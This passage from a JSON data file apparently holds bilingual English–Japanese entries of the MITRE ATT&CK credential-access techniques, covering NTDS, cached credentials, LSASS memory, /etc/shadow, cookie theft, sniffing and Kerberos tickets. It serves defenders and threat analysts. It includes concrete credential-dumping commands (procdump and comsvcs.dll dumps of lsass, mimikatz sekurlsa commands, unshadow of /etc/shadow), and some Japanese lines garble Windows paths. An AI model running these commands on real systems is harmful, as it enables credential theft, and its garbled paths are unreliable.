                        "description_jp": "攻撃者は、デバイス、ユーザー、アクセス権などのドメインメンバーに関する他の情報だけでなく、クレデンシャル情報を盗むために、Active Directoryドメインデータベースにアクセスしたり、そのコピーを作成しようとすることがある。デフォルトでは、NTDSファイル(NTDS.dit)はドメインコントローラの<code>%SystemRoot%NTDS</code>にある(引用: Wikipedia Active Directory)。\n\n敵対者は、アクティブなドメインコントローラーのNTDSファイルを探すことに加えて、同じまたは類似の情報を含むバックアップを検索する可能性がある(引用：Metcalf 2015)\n\nNTDSファイルとActive Directory全体のハッシュの内容を列挙するには、以下のツールやテクニックを使用できます。\n\n* ボリュームシャドウコピー\n* secretsdump.py\n* Windows内蔵ツールのntdsutil.exeを使用する。\n* Invoke-NinjaCopy"
                    },
                    {
                        "id": "T1003.005",
                        "name_eng": "Cached Domain Credentials",
                        "name_jp": "キャッシュされたドメイン認証情報",
                        "description_eng": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) \n\nWith SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",
                        "description_jp": "攻撃者は、ドメインコントローラーが使用できない場合に認証を行うために使用される、キャッシュされたドメイン認証情報へのアクセスを試みる可能性があります。\n\nWindows Vista 以降では、ハッシュ形式は DCC2 (Domain Cached Credentials version 2) ハッシュで、MS-Cache v2 ハッシュとしても知られています(引用: PassLib mscache)。デフォルトでキャッシュされる資格情報の数はさまざまで、システムごとに変更できます。このハッシュはパスザハッシュスタイルの攻撃を許さず、代わりに平文のパスワードを回復するために[パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002)を必要とする(引用: ired mscache)。\n\nLinux システムでは、Active Directory 認証情報は System Security Services Daemon (SSSD) や Quest Authentication Services (旧 VAS) のようなソフトウェアが保持するキャッシュからアクセスできる。キャッシュされた認証情報のハッシュは通常、SSSD の場合は `/var/lib/sss/db/cache.[domain].ldb` に、Quest の場合は `/var/opt/quest/vas/authcache/vas_auth.vdb` にある。攻撃者はこれらのデータベースファイルに対して`tdbdump`のようなユーティリティを使ってキャッシュされたハッシュをダンプし、[Password Cracking](https://attack.mitre.org/techniques/T1110/002)を使って平文のパスワードを得ることができる(引用: Brining MimiKatz to Unix)\n\nSYSTEMまたはsudoアクセスがあれば、[Mimikatz](https://attack.mitre.org/software/S0002)、[Reg](https://attack.mitre.org/software/S0075)、Windows用のsecretsdump.pyまたはLinux用のLinikatzなどのツール/ユーティリティを使用して、キャッシュされた認証情報を抽出できる(引用：Bringing MimiKatz to Unix)\n\n注：Windows Vista 用のキャッシュされた資格情報は、PBKDF2 を使用して導き出される(引用：PassLib mscache)"
                    },
                    {
                        "id": "T1003.001",
                        "name_eng": "LSASS Memory",
                        "name_jp": "LSASSメモリー",
                        "description_eng": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)",
                        "description_jp": "攻撃者は、LSASS（Local Security Authority Subsystem Service）のプロセスメモリに格納されたクレデンシャル資料へのアクセスを試みる可能性がある。ユーザがログオンすると、システムはさまざまなクレデンシャル資料を生成し、LSASSプロセス・メモリに保存する。これらのクレデンシャル資料は、管理ユーザーまたはSYSTEMによって採取され、[代替認証資料の使用](https://attack.mitre.org/techniques/T1550)を使用して[横移動](https://attack.mitre.org/tactics/TA0008)を実行するために使用される可能性がある。\n\nインメモリ技術と同様に、LSASSプロセス・メモリをターゲット・ホストからダンプし、ローカル・システム上で分析することもできます。\n\n例えば、ターゲットホスト上で procdump を使用します：\n\n<code>procdump -ma lsass.exe lsass_dump</code> を使用します。\n\nローカルでは、mimikatz を次のように実行します：\n\n<code>sekurlsa::Minidump lsassdump.dmp</code> を使用して実行できます。\n<code>sekurlsa::logonPasswords</code> を使用します。\n\ncomsvcs.dll`のようなWindowsの組み込みツールも使用できる：\n\n<code>rundll32.exe C:\\WindowsSystem32\\comsvcs.dll MiniDump PID lsass.dmp full</code>(Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nイメージファイル実行オプションインジェクション](https://attack.mitre.org/techniques/T1546/012)と同様に、サイレントプロセス終了メカニズムを悪用し、Windowsエラーレポート(`WerFault.exe`)を通じて`lsass.exe`のメモリダンプを作成することができます(引用: Deep Instinct LSASS)。\n\nWindows Security Support Provider (SSP) DLLは、システム起動時にLSASSプロセスにロードされます。LSAにロードされると、SSP DLLは、ログオンしているユーザーのドメインパスワードやスマートカードPINなど、Windowsに保存されている暗号化パスワードや平文パスワードにアクセスできる。SSP 構成は、2つのレジストリ・キーに格納される：<Code>HKLMSYSTEM\\CurrentControlSetControlLsaSecurity Packages</code> と <Code>HKLMSYSTEM\\CurrentControlSetControlLsaOSConfig\\Security Packages</code> である。敵対者は、これらのレジストリ・キーを変更して新しいSSPを追加し、次回システム起動時、またはAddSecurityPackage Windows API関数が呼び出されたときにロードする可能性がある(Citation: Graeber 2014)。\n\n以下の SSP は認証情報へのアクセスに使用できる：\n\n* Msv: インタラクティブ・ログオン、バッチ・ログオン、サービス・ログオンは MSV 認証パッケージを通して行われる。\n* Wdigest：Wdigest: ダイジェスト認証プロトコルは、ハイパーテキスト転送プロトコル(HTTP)と単純認証セキュ リティ・レイヤ(SASL)交換で使用するために設計されている。\n* Kerberos：Kerberos：Windows 2000 以降で、クライアントとサーバーの相互ドメイン認証に使用される。\n* CredSSP：リモートデスクトップサービスの SSO およびネットワークレベル認証を提供する(引用：TechNet Blogs Credential Protection)。"
                    },
                    {
                        "id": "T1003.008",
                        "name_eng": "/etc/passwd and /etc/shadow",
                        "name_jp": "/etc/passwdと/etc/shadow",
                        "description_eng": "Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\n\nLinux stores user information such as user ID, group ID, home directory path, and login shell in <code>/etc/passwd</code>. A \"user\" on the system may belong to a person or a service. All password hashes are stored in <code>/etc/shadow</code> - including entries for users with no passwords and users with locked or disabled accounts.(Citation: Linux Password and Shadow File Formats)\n\nAdversaries may attempt to read or dump the <code>/etc/passwd</code> and <code>/etc/shadow</code> files on Linux systems via command line utilities such as the <code>cat</code> command.(Citation: Arctic Wolf) Additionally, the Linux utility <code>unshadow</code> can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command <code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>(Citation: nixCraft - John the Ripper). Since the user information stored in <code>/etc/passwd</code> are linked to the password hashes in <code>/etc/shadow</code>, an adversary would need to have access to both.",
                        "description_jp": "攻撃者は、<code>/etc/passwd</code>と<code>/etc/shadow</code>の内容をダンプして、オフラインでのパスワード・クラッキングを可能にしようとするかもしれません。最近のほとんどの Linux オペレーティングシステムでは、<code>/etc/passwd</code> と <code>/etc/shadow<//code> の組み合わせを使って、<code>/etc/shadow</code> にパスワードハッシュを含むユーザーアカウント情報を保存しています。デフォルトでは、<code>/etc/shadow</code>はrootユーザーのみが読むことができる(引用: Linux Password and Shadow File Formats)\n\nLinuxは、<code>/etc/passwd</code>にユーザーID、グループID、ホーム・ディレクトリ・パス、ログイン・シェルなどのユーザー情報を保存する。システム上の \"ユーザー \"は、個人またはサービスに属する。すべてのパスワードハッシュは<code>/etc/shadow</code>に格納され、パスワードのないユーザーや、ロックされたり無効化されたアカウントのユーザーのエントリも含まれる(引用：Linux Password and Shadow File Formats)\n\n攻撃者は、<code>/etc/passwd</code> および <code>/etc/shadow</code> ファイルを、<code>/cat</code> コマンドなどのコマンドライン ユーティリティを使用して、Linux システム上で読み取ったりダンプしようとしたりする可能性があります。(引用: Arctic Wolf) さらに、Linux ユーティリティ <code>unshadow</code> を使用して、John the Ripper のようなパスワードクラッキングユーティリティに適した形式で 2 つのファイルを結合することができます - たとえば、<code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code> というコマンドを実行します (引用: nixCraft - John the Ripper)。<code>/etc/passwd</code>に保存されているユーザー情報は、<code>/etc/shadow</code>のパスワードハッシュとリンクしているため、敵対者は両方にアクセスする必要がある。"
                    }
                ]
            },
            {
                "id": "T1539",
                "name_eng": "Steal Web Session Cookie",
                "name_jp": "ウェブセッションクッキーを盗む",
                "description_eng": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "description_jp": "敵対者はウェブ・アプリケーションやサービスのセッション・クッキーを盗み、それを使ってウェブ・アプリケーションやイ ンターネット・サービスに認証されたユーザとして、認証情報を必要とせずにアクセスすることができます。ウェブ・アプリケーションやサービスは、ユーザがウェブサイトに認証された後の認証トークンとしてセッション・クッキーを使うことがよくあります。\n\nクッキーは多くの場合、ウェブアプリケーションがアクティブに使用されていなくても、長期間有効です。クッキーはディスク、ブラウザのプロセス・メモリ、及びリモート・システムへのネットワーク・トラフィックの中に見つかります。さらに、ターゲット・マシン上の他のアプリケーションは機密性の高い認証クッキーをメモリに保存するかもしれません(例えばクラウドサ ービスへの認証を行うアプリケーション)。セッションクッキーは、いくつかの多要素認証プロトコルをバイパスするために使用することができます（引用：Pass The Cookie）。\n\n(引用: Kaspersky TajMahal 2019 年 4 月)(引用: Unit 42 Mac Crypto Cookies 2019 年 1 月) 敵はまた、ウェブサイトに悪意のある JavaScript コンテンツを注入したり、被害者を騙してブラウザで悪意のある JavaScript を実行させることで [User Execution](https://attack.mitre.org/techniques/T1204) に依存して Cookie を盗むこともあります(引用: Talos Roblox Scam 2023 年)(引用: Krebs Discord Bookmarks 2023 年)。\n\nまた、`Evilginx2` や `Muraena` のようなオープンソースのフレームワークもあり、悪意のあるプロキシ(例えば、[Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))を通じてセッションクッキーを収集することができます。このフレームワークは敵対者によって設定され、フィッシングキャンペーンで使用される可能性があります。(引用: Github evilginx2)(Citation: GitHub Mauraena)\n\n敵対者が有効なクッキーを獲得した後、対応するウェブ・アプリケーションにログインするために[ウェブ・セッション・クッキー](https://attack.mitre.org/techniques/T1550/004)の技法を実行することができます。",
                "subtechniques": []
            },
            {
                "id": "T1040",
                "name_eng": "Network Sniffing",
                "name_jp": "ネットワーク・スニッフィング",
                "description_eng": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "description_jp": "攻撃者は、受動的にネットワーク・トラフィックをスニッフィングして、ネットワーク上を通過する認証材料など、環境に関する情報をキャプチャすることがある。ネットワーク・スニッフィングとは、システムのネットワーク・インタフェースを使用して、有線または無線接続を介して送信される情報を監視またはキャプチャすることを指す。敵は、ネットワーク・インタフェースをプロミスキャス・モードにして、ネットワーク上を通過するデータに受動的にアクセスしたり、スパン・ポートを使用して大量のデータをキャプチャしたりすることがある。\n\nこのテクニックを使ってキャプチャされたデータには、特に安全でない暗号化されていないプロトコルで送信されたユーザー・クレデンシャルが含まれる可能性があります。LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001)のような名前サービス解決ポイズニングのテクニックも、トラフィックを敵にリダイレクトすることで、ウェブサイト、プロキシ、内部システムへの認証情報をキャプチャするために使用できます。\n\nネットワークスニッフィングは、実行中のサービス、バージョン番号、その他のネットワーク特性（IP アドレス、ホスト名、VLAN ID など）など、その後の [Lateral Movement](https://attack.mitre.org/tactics/TA0008) および/または [Defense Evasion](https://attack.mitre.org/tactics/TA0005) 活動に必要な設定の詳細を明らかにする可能性があります。攻撃者はまた、受動的に環境に関する追加的な知識を得るために、[Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM)の間、ネットワーク・スニッフィングを利用する可能性があります。\n\nクラウドベースの環境では、敵はトラフィックミラーリングサービスを使用して、仮想マシンからのネットワークトラフィックをスニッフィングすることができる。例えば、AWS Traffic Mirroring、GCP Packet Mirroring、Azure vTapでは、トラフィックを収集する特定のインスタンスと、収集したトラフィックを送信する特定のターゲットを定義することができます（引用：AWS Traffic Mirroring）（引用：GCP Packet Mirroring）（引用：Azure Virtual Network TAP）多くの場合、トラフィックの暗号化と復号化の負担を軽減するために、ロードバランサーレベルでTLS終端を使用するため、このトラフィックの多くは平文になります。(引用：Rhino Security Labs AWS VPC Traffic Mirroring)(引用：SpecterOps AWS Traffic Mirroring) 敵対者は、スニッフィングされたトラフィックにアクセスするために、クラウドアカウントにデータを転送するなどの流出テクニックを使用することができます(引用：Rhino Security Labs AWS VPC Traffic Mirroring)\n\nネットワークデバイス上で、敵対者は、`monitor capture` などの [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) コマンドを使用して、ネットワークキャプチャを実行する可能性があります。(引用：US-CERT-TA18-106A)(引用：capture_embedded_packet_on_software)",
                "subtechniques": []
            },
            {
                "id": "T1558",
                "name_eng": "Steal or Forge Kerberos Tickets",
                "name_jp": "ケルベロス・チケットを盗む、または偽造する",
                "description_eng": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)",
                "description_jp": "攻撃者は、[Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)を有効にするために、Kerberosチケットを盗んだり偽造したりして、Kerberos認証を破壊しようとするかもしれない。Kerberosは、最新のWindowsドメイン環境で広く使われている認証プロトコルである。レルム」と呼ばれるKerberos環境では、クライアント、サービス、および鍵配布センター（KDC）の3つの基本的な参加者が存在する（引用：ADSecurity Kerberos Ring Decoder）。クライアントはサービスへのアクセスを要求し、KDCから発信されるKerberosチケットの交換を通じて、認証に成功した後にアクセスが許可される。KDCは認証とチケット付与の両方に責任を負う。  攻撃者はチケットを盗んだり、不正アクセスを可能にするためにチケットを偽造したりして、Kerberosを悪用しようとするかもしれない。\n\nWindowsでは、組み込みの<code>klist</code>ユーティリティを使用して、キャッシュされたKerberosチケットを一覧表示し、分析することができる(引用: Microsoft Klist)",
                "subtechniques": [
                    {
                        "id": "T1558.003",
                        "name_eng": "Kerberoasting",
                        "name_jp": "ケルベロースティング",
                        "description_eng": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                        "description_jp": "攻撃者は、有効なKerberosチケット付与チケット(TGT)を悪用したり、ネットワークトラフィックを盗聴して、[ブルートフォース](https://attack.mitre.org/techniques/T1110)に脆弱なチケット付与サービス(TGS)チケットを取得する可能性があります。(引用: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nサービスプリンシパル名（SPN）は、Windowsサービスの各インスタンスを一意に識別するために使用される。認証を有効にするために、KerberosはSPNが少なくとも1つのサービスログオンアカウント(サービスを実行することを特に任務とするアカウント(引用: Microsoft Detecting Kerberoasting Feb 2018))に関連付けられていることを要求する(引用: Microsoft SPN)(引用: Microsoft SetSPN)(引用: SANS Attacking Kerberos Nov 2014)(引用: Harmj0y Kerberoast Nov 2016)\n\n有効なKerberosチケット付与チケット(TGT)を所有する攻撃者は、ドメインコントローラー(DC)から任意のSPNに対して1つ以上のKerberosチケット付与サービス(TGS)サービスチケットを要求することができる。(引用: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) これらのチケットの一部は、RC4アルゴリズムで暗号化されている可能性があります。つまり、SPNに関連付けられたサービスアカウントのKerberos 5 TGS-REP etype 23ハッシュが秘密鍵として使用されるため、オフライン[ブルートフォース](https://attack.mitre.org/techniques/T1110)攻撃によって平文の認証情報が暴露される可能性がある。(引用：AdSecurity Cracking Kerberos Dec 2015)(引用：Empire InvokeKerberoast Oct 2016)(Citation：Harmj0y Kerberoast Nov 2016)\n\nこれと同じ動作は、ネットワークトラフィックからキャプチャされたサービスチケットを使用して実行される可能性がある(引用: AdSecurity Cracking Kerberos Dec 2015)\n\nクラックされたハッシュは、[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスを通じて、[永続性](https://attack.mitre.org/tactics/TA0003)、[特権のエスカレーション](https://attack.mitre.org/tactics/TA0004)、[横移動](https://attack.mitre.org/tactics/TA0008)を可能にする可能性がある(引用: SANS Attacking Kerberos Nov 2014)"
                    },
                    {
                        "id": "T1558.002",
                        "name_eng": "Silver Ticket",
                        "name_jp": "シルバーチケット",
                        "description_eng": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)\n\nPassword hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",
                        "description_jp": "対象となるサービスアカウント（SharePointやMSSQLなど）のパスワードハッシュを持つ攻撃者は、シルバーチケットとも呼ばれるKerberosチケット付与サービス（TGS）チケットを偽造する可能性がある。KerberosのTGSチケットは、サービスチケットとしても知られている(引用：ADSecurity Silver Tickets)\n\nシルバー・チケットは、敵対者が特定のリソース（MSSQLなど）とリソースをホストするシステムにアクセスできるようにするだけという点で、ゴールデン・チケットよりも範囲が限定されています。しかし、ゴールデン・チケットとは異なり、シルバー・チケットを偽造する能力を持つ敵対者は、鍵配布センター（KDC）とやり取りすることなくTGSチケットを作成できるため、潜在的に検出が難しくなります。\n\n対象サービスのパスワード・ハッシュは、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)または[Kerberoasting](https://attack.mitre.org/techniques/T1558/003)を使用して取得することができる。"
                    },
                    {
                        "id": "T1558.005",
                        "name_eng": "Ccache Files",
                        "name_jp": "キャッシュファイル",
                        "description_eng": "Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials. \n\nThe <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the `/tmp` directory with a naming format of `krb5cc_%UID%` or `krb5.ccache`. On macOS, ccache entries are stored by default in memory with an `API:{uuid}` naming scheme. Typically, users interact with ticket storage using <code>kinit</code>, which obtains a Ticket-Granting-Ticket (TGT) for the principal; <code>klist</code>, which lists obtained tickets currently held in the credentials cache; and other built-in binaries.(Citation: Kerberos GNU/Linux)(Citation: Binary Defense Kerberos Linux)\n\nAdversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to perform [Privilege Escalation](https://attack.mitre.org/tactics/TA0004). Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for further [Lateral Movement](https://attack.mitre.org/tactics/TA0008). On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)",
                        "description_jp": "攻撃者は、クレデンシャル・キャッシュ・ファイル（または ccache）に保存されている Kerberos チケットを盗もうとする可能性がある。これらのファイルは、ユーザーのアクティブなセッション認証情報を短期間保存するために使用される。ccacheファイルはユーザー認証時に作成され、ユーザーがクレデンシャルを再入力することなく複数のサービスにアクセスできるようにする。\n\n<code>/etc/krb5.conf</code>設定ファイルと<code>KRB5CCNAME</code>環境変数は、ccacheエントリの保存場所を設定するために使用される。Linuxでは、認証情報は通常、`krb5cc_%UID%`または`krb5.ccache`という命名形式で、`/tmp`ディレクトリに格納される。macOSでは、ccacheのエントリはデフォルトで`API:{uuid}`の命名スキームでメモリに保存されます。一般的に、ユーザは<code>kinit</code>を使ってチケットストレージとやりとりする。<code>kinit</code>はプリンシパルのチケット付与チケット(TGT)を取得し、<code>klist</code>は資格情報キャッシュに現在保持されている取得済みチケットを一覧表示する。\n\n攻撃者はディスクに保存されたccacheファイルからチケットを収集し、パスワードなしで現在のユーザーとして認証して[Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)攻撃を行うことができる。攻撃者はまた、これらのチケットを使用して、昇格した特権を持つ正当なユーザーになりすまし、[特権のエスカレーション](https://attack.mitre.org/tactics/TA0004)を実行することもできます。Kekeoのようなツールは、さらに[横移動](https://attack.mitre.org/tactics/TA0008)を行うためにccacheファイルをWindowsフォーマットに変換するために敵対者によって使用されることもある。macOSでは、敵対者はオープンソースツールまたはKerberosフレームワークを使用してccacheファイルと対話し、低レベルのAPIを介してTGTまたはサービスチケットを抽出することができる(引用: SpectorOps Bifrost Kerberos macOS 2019)(引用: Linux Kerberos Tickets)(引用: Brining MimiKatz to Unix)(引用: Kekeo)"
                    },
                    {
                        "id": "T1558.004",
                        "name_eng": "AS-REP Roasting",
                        "name_jp": "AS-REP焙煎",
